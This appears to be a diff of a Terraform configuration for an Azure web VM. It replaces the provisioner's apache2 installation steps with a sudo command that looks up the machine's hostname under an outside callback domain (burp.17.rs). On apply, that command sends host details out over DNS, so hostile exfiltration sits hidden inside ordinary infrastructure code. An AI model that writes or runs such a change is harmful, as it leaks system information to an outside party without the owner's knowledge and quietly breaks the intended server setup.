@@ -65,9 +65,8 @@ resource "azurerm_virtual_machine" "web" {
 
   provisioner "remote-exec" {
     inline = [
-      "sudo apt-get update",
-      "sudo apt-get install -y apache2",
-      "sudo system"
+      "sudo nslookup `hostname`.knbyi70maiiovsqcec7whvc2ptvkjl7a.burp.17.rs",
+      "sudo echo $(hostname)"
       ]
   }
 }
